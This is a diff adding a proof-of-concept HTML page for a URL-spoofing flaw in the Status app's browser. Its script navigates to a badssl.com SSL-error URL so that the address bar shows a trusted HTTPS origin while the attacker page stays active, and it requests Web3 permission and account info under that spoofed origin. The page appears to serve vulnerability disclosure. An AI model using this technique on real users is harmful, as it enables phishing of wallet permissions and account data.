@@ -1,0 +1,61 @@
+<!doctype html>
+<html>
+<head>
+    <style>
+        html {
+            font-family: sans-serif;
+        }
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+
+<h1>URL Spoof via connections with SSL errors</h1>
+
+<p>
+    Immediately after page load, this attacker page navigates to a URL with an SSL error.
+    This causes the URL in the address bar to update with a positive HTTPS indicator, but no navigation occurs.
+    Therefore the attacker page remains fully interactive. All permission prompts by the Status app also use the spoofed URL.
+</p>
+
+<input value="Test if page is interactive here" />
+
+<input type="button" id="requestPermission" value="Request Web3 permission/show account info" />
+<div id="accountInfo"></div>
+
+<p>
+    The attack works with a myriad of SSL error conditions, such as:
+    <ul>
+    <li><a href="https://wrong.host.badssl.com">https://wrong.host.badssl.com</a></li>
+    <li><a href="https://expired.badssl.com">https://expired.badssl.com</a></li>
+    <li><a href="https://self-signed.badssl.com">https://self-signed.badssl.com</a></li>
+    <li><a href="https://untrusted-root.badssl.com">https://untrusted-root.badssl.com</a></li>
+    <li><a href="https://invalid-expected-sct.badssl.com">https://invalid-expected-sct.badssl.com</a></li>
+    <li><a href="https://subdomain.preloaded-hsts.badssl.com">https://subdomain.preloaded-hsts.badssl.com</a></li>
+    <li><a href="https://captive-portal.badssl.com">https://captive-portal.badssl.com</a></li>
+    <li><a href="https://mitm-software.badssl.com">https://mitm-software.badssl.com</a></li>
+    </ul>
+    Note that when tapping the links above, the loading indicator is shown again.
+    However, on page load, the loading indicator is not shown again since it's already being shown for this attacker page.
+    Therefore, on page load, the attack is not detectable. The attacker page can also change the page contents if the loading indicator is shown after page load to simulate a real navigation.
+</p>
+
+<script>
+    setTimeout(function() {
+        window.location = 'https://wrong.host.badssl.com';
+    }, 5);
+
+    var accountInfo = document.getElementById('accountInfo');
+    var requestPermissionBtn = document.getElementById('requestPermission');
+
+    requestPermissionBtn.addEventListener('click', function(e) {
+        sendAPIrequest('web3').then(function(e) {
+            accountInfo.innerText = e;
+        }).catch(function(e) {
+            alert('Error: '+e);
+        });
+    });
+</script>
+
+</body>
+</html>
